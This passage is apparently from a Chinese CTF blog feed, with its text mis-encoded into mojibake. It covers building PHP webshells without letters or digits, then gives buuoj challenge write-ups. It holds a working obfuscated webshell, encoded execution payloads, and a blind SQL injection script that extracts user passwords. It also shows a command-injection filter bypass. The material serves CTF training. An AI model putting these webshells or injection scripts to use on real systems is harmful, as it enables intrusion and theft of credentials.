class="line">$____($_[$__]);    &#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæœ‰ä¸€ç§ç®€çŸ­çš„å†™æ³•${~â€\xa0\xb8\xba\xabâ€}å®ƒç­‰äº$_GETã€‚è¿™é‡Œç›¸å½“äºç›´æ¥æŠŠutf8ç¼–ç çš„æŸä¸ªå­—èŠ‚æå–å‡ºæ¥ç»Ÿä¸€è¿›è¡Œå–åã€‚</p><h2 id="åˆ©ç”¨å­—ç¬¦ä¸²è‡ªå¢-è‡ªå‡"><a href="#åˆ©ç”¨å­—ç¬¦ä¸²è‡ªå¢-è‡ªå‡" class="headerlink" title="åˆ©ç”¨å­—ç¬¦ä¸²è‡ªå¢/è‡ªå‡"></a>åˆ©ç”¨å­—ç¬¦ä¸²è‡ªå¢/è‡ªå‡</h2><p>phpçš„å°æŠ€å·§ï¼Œå…ˆçœ‹æ–‡æ¡£ï¼š<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a><br><img src="/images/20200723234649.png" alt=""><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€™aâ€™++ =&gt; â€˜bâ€™ï¼Œâ€™bâ€™++ =&gt; â€˜câ€™â€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚<br>æ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™å’Œå¤§å†™Aï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-Zçš„æ‰€æœ‰å­—æ¯ã€‚<br>åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">echo $_[0].$_[3];</span><br><span class="line">&#x2F;&#x2F; è¾“å‡ºAa</span><br></pre></td></tr></table></figure><p>å†åŠ ä¸Šæˆ‘ä»¬ä¸é€‚ç”¨æ•°å­—æ„é€ å‡ºçš„æ•°å­—ï¼Œå†™å‡ºä¸‹é¢è¿™ä¸ªwebshellï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[(&#39;(&#39;&#x3D;&#x3D;&#39;&#x3D;&#39;)]; &#x2F;&#x2F; $_&#x3D;$_[0];$_&#x3D;A;</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; E</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; R</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; T</span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">@$___($_[_]);</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸï¼š<br><img src="/images/20200724000716.png" alt=""></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>åœ¨ä¸Šé¢é‚£é“é¢˜ä¸­æœ‰ä¸€ä¸ªpayloadæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨äº†php7ä¸­æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„æ–¹æ³•ï¼Œåœ¨php5ä¸­æ˜¯æ‰§è¡Œä¸æˆåŠŸçš„ï¼Œæˆ‘ä»¬æ¥æ‹†è§£åˆ†æä¸€ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%ff ^ %160 &#x3D; _</span><br><span class="line">%ff ^ %184 &#x3D; G</span><br><span class="line">%ff ^ %186 &#x3D; E</span><br><span class="line">%ff ^ %171 &#x3D; T</span><br><span class="line">%ff%ff%ff%ff^%a0%b8%ba%ab &#x3D; _GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125; &#x3D; $_GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125; &#x3D; $_GET&#123;%ff&#125;</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ”¾å‡ºä¸€ä¸ªfuzzè„šæœ¬ï¼Œå¸®åŠ©å¿«é€Ÿæ‰¾åˆ°å¼‚æˆ–çš„å­—ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &#39;&#39;;</span><br><span class="line">$argv &#x3D; str_split(&#39;_GET&#39;);</span><br><span class="line"></span><br><span class="line">for ($i&#x3D;0; $i &lt; count($argv); $i++) &#123; </span><br><span class="line">for ($j&#x3D;0; $j &lt; 255; $j++) &#123; </span><br><span class="line">$k &#x3D; chr($j)^chr(255);  &#x2F;&#x2F;dechex(255)&#x3D;0xff</span><br><span class="line">if($k &#x3D;&#x3D; $argv[$i])&#123;</span><br><span class="line">echo &quot;%ff ^ %&quot;.$j.&quot; &#x3D; &quot;.$k.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload .&#x3D; &#39;%&#39;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure><p><img src="/images/20200723223428.png" alt=""></p><p>è¿˜æœ‰ä¸€ä¸ªpayloadæ˜¯è¿™æ ·çš„ï¼Œè¿™ä¸ªæ˜¯å–åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰è¿™ä¸ªpayloadï¼Œä¹Ÿæ˜¯å–å:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯<code>~</code>åœ¨{}ä¸­æ‰§è¡Œäº†å–åæ“ä½œï¼Œæ‰€ä»¥${~â€\xa0\xb8\xba\xabâ€}å–åç›¸å½“äº$_GETã€‚</p><h1 id="è„šæœ¬æ€»ç»“"><a href="#è„šæœ¬æ€»ç»“" class="headerlink" title="è„šæœ¬æ€»ç»“"></a>è„šæœ¬æ€»ç»“</h1><h2 id="å¯»æ‰¾å¼‚æˆ–å­—ç¬¦è„šæœ¬"><a href="#å¯»æ‰¾å¼‚æˆ–å­—ç¬¦è„šæœ¬" class="headerlink" title="å¯»æ‰¾å¼‚æˆ–å­—ç¬¦è„šæœ¬"></a>å¯»æ‰¾å¼‚æˆ–å­—ç¬¦è„šæœ¬</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [writelist];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            if($exp&#x3D;&#x3D;&#39;_G&#39;)&#123;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        if($exp&#x3D;&#x3D;&#39;ET&#39;)&#123;</span><br><span class="line">        echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¯»æ‰¾å–åå­—ç¬¦è„šæœ¬"><a href="#å¯»æ‰¾å–åå­—ç¬¦è„šæœ¬" class="headerlink" title="å¯»æ‰¾å–åå­—ç¬¦è„šæœ¬"></a>å¯»æ‰¾å–åå­—ç¬¦è„šæœ¬</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">def get(shell):</span><br><span class="line">     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">     print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#39;phpinfo&#39;)</span><br><span class="line">&#x2F;&#x2F;0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><p>```</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ€è¿‘ç¢°åˆ°ä¸€é“é¢˜ï¼Œä¾¿å­¦ä¹ äº†ä¸€ä¸‹ç›¸å…³æ— å­—æ¯æ•°å­—æ„é€ webshellçš„çŸ¥è¯†ã€‚é¢˜ç›®å¦‚ä¸‹ï¼š&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buuoj åˆ·é¢˜è®°å½•ï¼ˆäºŒï¼‰</title>
    <link href="http://yoursite.com/2020/07/20/buuoj-02/"/>
    <id>http://yoursite.com/2020/07/20/buuoj-02/</id>
    <published>2020-07-20T13:10:26.000Z</published>
    <updated>2020-07-31T08:17:37.621Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><blockquote><p>è€ƒç‚¹ï¼šç›²æ³¨ï¼Œæ–‡ä»¶ä¸Šä¼ <br>æŸ¥çœ‹robots.txtï¼š</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…è¿‡ç¨‹å‘ç°<strong>user.php</strong>å’Œ<strong>image.php</strong>ï¼Œäºæ˜¯ä¸‹è½½æºç ï¼ŒæŸ¥çœ‹image.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;ï»¿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;addslashes($id);</span><br><span class="line">$path&#x3D;addslashes($path);</span><br><span class="line"></span><br><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image&#x2F;jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>GETè¯·æ±‚idå’Œpathå‚æ•°æ—¶é¦–å…ˆç»è¿‡<strong>addslashes()</strong>å‡½æ•°è½¬ä¹‰ï¼Œåœ¨<strong>å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ å’ŒNULL</strong>å‰é¢åŠ ä¸Šåæ–œæ â€œ\â€,<br>ç„¶åå†ç»è¿‡<strong>str_replace()</strong>å‡½æ•°æŠŠ<code>&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;</code>ä¸­çš„ä»»æ„ä¸€ä¸ªæ›¿æ¢ä¸ºç©ºï¼Œ<br>ä¸‹é¢çš„selectè¯­å¥æ„é€ sqlæ³¨å…¥ï¼Œä¼ å…¥çš„å€¼ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;\0&amp;path&#x3D; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure><p>ç»è¿‡addslashes()å¤„ç†ä¹‹åselectè¯­å¥å°±å˜æˆäº†</p><figure class="highlight plain"><figcaption><span>* from images where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å†ç»è¿‡str_replace()å‡½æ•°å¤„ç†ä¹‹åå˜æˆäº†</span><br><span class="line">&#96;&#96;&#96;select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1%23&#39;&quot;);</span><br></pre></td></tr></table></figure><p>æ„é€ æˆåŠŸï¼Œç›²æ³¨pythonè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn&#x2F;image.php&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        # payload &#x3D; &#39;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&#39;.format(i,j)</span><br><span class="line">        # æ•°æ®åº“ï¼š ciscnfinal</span><br><span class="line">        # payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;0x636973636e66696e616c),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # è¡¨åï¼š images,users</span><br><span class="line">        #payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x7573657273),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # usersåˆ—åï¼š username,password</span><br><span class="line">        payload &#x3D; &quot;?id&#x3D;%5C0&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # passwor: b5fef2a49e1cee3ee711</span><br><span class="line">        r &#x3D; requests.get(url+payload)</span><br><span class="line">        #print(url + path)</span><br><span class="line">        if len(r.text)&gt;10000:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    if(j&#x3D;&#x3D;127):</span><br><span class="line">        break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å’Œå¯†ç ç™»é™†ï¼Œæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢<br>ä¸Šä¼ æ–‡ä»¶ä¹‹åæŠŠä¸Šä¼ æ—¥å¿—è®°å½•åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè€Œæ²¡æœ‰ç»™å‡ºæ–‡ä»¶è·¯å¾„ï¼Œè€ƒè™‘æ–‡ä»¶åæ³¨å…¥ä¸€å¥è¯ï¼Œphpè¢«è¿‡æ»¤ï¼Œé€‰æ‹©<code>&lt;?= ?&gt;</code>æ ‡ç­¾ï¼Œå³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ã€‚</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12ä¸€é”®è·å–flagã€‚</p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><blockquote><p>è€ƒç‚¹ï¼šphpå¼±ç±»å‹ï¼Œå‘½ä»¤æ³¨å…¥<br>æŸ¥çœ‹æºç </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;level 1</span><br><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line">if (isset($_GET[&#39;md5&#39;]))&#123;</span><br><span class="line">   $md5&#x3D;$_GET[&#39;md5&#39;];</span><br><span class="line">   if ($md5&#x3D;&#x3D;md5($md5))</span><br><span class="line">       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get flag</span><br><span class="line">if (isset($_GET[&#39;get_flag&#39;]))&#123;</span><br><span class="line">    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¿«åˆ°éæ´²äº†&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸€å…±æœ‰ä¸‰å±‚ï¼Œç¬¬ä¸€å±‚åˆ©ç”¨phpå¼±ç±»å‹ï¼Œå³å¯ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(&#39;2e4&#39;)&#x3D;2</span><br><span class="line">intval(&#39;2e4&#39;+1)&#x3D;20001</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ä¹Ÿæ˜¯å¼±ç±»å‹ï¼Œæ‰¾åˆ°ä¸€ä¸ª0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå…¶md5å€¼ä¹Ÿæ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ç»•è¿‡ï¼Œå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚<br>ç¬¬ä¸‰å±‚æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œä¸èƒ½æœ‰ç©ºæ ¼å’Œcatï¼Œç©ºæ ¼ç”¨<code>$IFS$9</code>æ›¿æ¢ï¼Œcatç”¨tacæ›¿æ¢ï¼Œç„¶åè¯»å–flagã€‚</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 